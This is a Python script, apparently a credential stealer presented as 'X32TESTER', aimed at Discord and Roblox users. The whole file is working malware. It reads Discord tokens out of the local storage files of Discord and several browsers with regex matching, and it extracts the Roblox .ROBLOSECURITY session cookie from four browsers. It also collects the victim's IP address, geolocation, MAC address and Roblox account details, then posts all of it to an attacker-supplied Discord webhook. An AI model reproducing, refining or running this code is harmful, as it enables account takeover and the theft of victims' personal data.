
import os
import requests
import re
import browser_cookie3

ascii_art_2 = '''
$$\\   $$\\  $$$$$$\\   $$$$$$\\        $$$$$$$\\ $$$$$$$\\  $$$$$$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$$\\  
$$ |  $$ |$$ ___$$\\ $$  __$$\\       \\__$$  __|$$  _____|$$  __$$\\\\__$$  __|$$  _____|$$  __$$\\ 
\\$$\\ $$  |\\_/   $$ |\\__/  $$ |         $$ |   $$ |      $$ /  \\__|  $$ |   $$ |      $$ |  $$ |
 \\$$$$  /   $$$$$ /  $$$$$$  |         $$ |   $$$$$\\    \\$$$$$$\\    $$ |   $$$$$\\    $$$$$$$  |
  $$  $$<    \\___$$\\ $$  ____/          $$ |   $$  __|    \\____$$\\   $$ |   $$  __|   $$  __$$< 
 $$  /\\$$\\ $$\\   $$ |$$ |               $$ |   $$ |      $$\\   $$ |  $$ |   $$ |      $$ |  $$ |
$$ /  $$ |\\$$$$$$  |$$$$$$$$\\          $$ |   $$$$$$$\\ \\$$$$$$  |  $$ |   $$$$$$$$\ $$ |  $$ |
\\__|  \\__| \\______/ \\________|         \\__|   \\________| \\______/   \\__|   \\________|\\__|  \\__|
                                                                                               
                                                                                               
                                                                                               
                                                                                               
                                                                                               
                                                                                               
                                                                                               
'''

print(ascii_art_2)





print("X32TESTER V1.0")


print(" ")

YOUR_URL = input("ENTER YOUR WEBHOOK URL --> ")


# Function to get public IP address
def GetIp():
    GrabIp = requests.get("https://api.ipify.org").text
    return GrabIp


#get the Geo ip 
GrabIpGeo = requests.get("https://api.ipify.org").text


def GetIpForGeoLocation():
    return GrabIpGeo


GeoLocationActivator = requests.get(f"http://ip-api.com/json/{GrabIpGeo}").text


# hold the info
def get_geo_location_activator():
    return GeoLocationActivator


  

# Function to get MAC address
def GetMacAddress():
    try:
        if os.name == 'posix':  
            result = os.popen('ifconfig | grep ether').read()
            mac_address = result.split()[1]
        elif os.name == 'nt':  
            result = os.popen('ipconfig /all | find "Physical Address"').read()
            mac_address = result.split()[-1]
        else:
            mac_address = "Not supported on this OS"

        return mac_address
    except:
        print("Couldn't get MAC address")

# Function to find tokens using the browser paths 
def find_tokens(paths):
    tokens = []

    for browser, path in paths.items():
        try:
            if not os.path.exists(path):
                print(f"Path not found for {browser}: {path}")
                continue

            for root, _, files in os.walk(path):
                for file_name in files:
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue

                    file_path = os.path.join(root, file_name)

                    with open(file_path, errors='ignore') as file:
                        for line in [x.strip() for x in file.readlines() if x.strip()]:
                            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                                for token in re.findall(regex, line):
                                    tokens.append({'browser': browser, 'token': token})
                                    print(f"Found discord token for {browser}: {token}")
        except Exception as e:
            print(f"Error while searching for tokens in {browser}: {e}")

    return tokens

# Function to get browser paths
def get_browser_paths():
    local_app_data = os.getenv('LOCALAPPDATA')
    app_data = os.getenv('APPDATA')

    paths = {
        'Discord': local_app_data + '\\Discord',
        'Google Chrome': local_app_data + '\\Google\\Chrome\\User Data\\Default',
        'Opera': app_data + '\\Opera Software\\Opera Stable',
        'Opera GX': app_data + '\\Opera Software\\Opera GX Stable',
        'Brave': local_app_data + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local_app_data + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    return paths



#just gets the roblox cookie even though you cant use them anymore

def get_cookie_value(browser_cookies, cookie_name, url):
    try:
        target_cookie = next(cookie for cookie in browser_cookies if cookie.name == cookie_name and cookie.domain in url)
        return target_cookie.value
    except StopIteration:
        print(f"Error: {cookie_name} cookie not found.")
        return None

def append_cookie_to_list(cookie_name, cookie_value, cookies_list):
    try:
        cookies_list.append({cookie_name: cookie_value})
        print(f"{cookie_name} cookie appended to the list.")
    except Exception as e:
        print(f"Error appending to list: {e}")

url = 'https://www.roblox.com'
cookie_name = '.ROBLOSECURITY'

all_cookies = []

chrome_value = None
 
try:
    chrome_cookies = browser_cookie3.chrome()
    chrome_value = get_cookie_value(chrome_cookies, cookie_name, url)
    if chrome_value:
        append_cookie_to_list(cookie_name, chrome_value, all_cookies)
except Exception as e:
    print(f"Error retrieving Chrome cookie{e}")

firefox_value = None

try:
    firefox_cookies = browser_cookie3.firefox()
    firefox_value = get_cookie_value(firefox_cookies, cookie_name, url)
    if firefox_value:
        append_cookie_to_list(cookie_name, firefox_value, all_cookies)
except Exception as e:
    print(f"Error retrieving Firefox cookie{e}")

edge_value = None

try:
    edge_cookies = browser_cookie3.edge()
    edge_value = get_cookie_value(edge_cookies, cookie_name, url)
    if edge_value:
        append_cookie_to_list(cookie_name, edge_value, all_cookies)
except Exception as e:
    print(f"Error retrieving Edge cookie{e}")

safari_value = None

try:
    safari_cookies = browser_cookie3.safari()
    safari_value = get_cookie_value(safari_cookies, cookie_name, url)
    if safari_value:
        append_cookie_to_list(cookie_name, safari_value, all_cookies)
except Exception as e:
    print(f"Error retrieving Safari cookie{e}")




#roblox headers
headers2 = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
    'cookie': f'{cookie_name}={chrome_value}'  
}









#Get roblox Account Details 

paths_to_search = get_browser_paths()

GetIp()
GetMacAddress()
find_tokens(paths_to_search)
GetIpForGeoLocation()










webhook_url = YOUR_URL

webhook_url = YOUR_URL




def GetRobloxAccDetails():
    response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers2)  
    user_info = response.json()  # Parse da response
    return user_info




user_info = GetRobloxAccDetails()



# Define GrabIp
GrabIpHolder =  (GetIp())

# grab the details
UserName = user_info.get('UserName')
RobuxBalance = user_info.get('RobuxBalance')
IsPremium = user_info.get('IsPremium')
ThumbnailUrl = user_info.get('ThumbnailUrl')
userId = user_info.get('UserID')



# Create the embed 
data = {
    "content": "X32 TEST LOG",
    "embeds": [
        {
            "title": "Roblox Account Details",
            "color": 0x3498db,
            "fields": [
                {"name": "THUMBNAIL", "value": ThumbnailUrl, "inline": True},
                {"name": "🧑 USERNAME", "value": UserName, "inline": True},
                {"name": "⏣ ROBUX", "value": RobuxBalance, "inline": True},
                {"name": "🌟 PREMIUM", "value": IsPremium, "inline": True},
                {"name": "🌐 IpAddress", "value": GrabIpHolder, "inline": True},
                {"name": "⚙️ MAC Address", "value": GetMacAddress(), "inline": True},
                {"name": "🪪 ROBLOX USERID", "value": userId, "inline": True},
                {"name": "🌎 geo location", "value": get_geo_location_activator(), "inline": True},
            ]
        }
    ]
}









#error handling
response = requests.post(webhook_url, json=data)

if response.status_code == 204:
    print("Embed sent successfully!")
else:
    print(f"Error sending embed. Status code: {response.status_code}, Response content: {response.text}")

#send the token to webhook
def send_to_discord_webhook(browser, token):
    payload = {
        'content': f"Found Discord token for {browser}: {token}"
    }

    response = requests.post(YOUR_URL, json=payload)

    print(f"Discord webhook response status code: {response.status_code}")




#send the roblox cookies to webhook 
def send_cookie_to_webhook(browser, cookie):
    payload = {
        'content': f"Found Roblox cookie for {browser}: {cookie}"
    }

    response = requests.post(YOUR_URL, json=payload)

    if response.status_code == 204:
        print(f"Roblox cookie sent successfully!")

send_cookie_to_webhook('Chrome', chrome_value)

send_to_discord_webhook('Discord', find_tokens(get_browser_paths()))


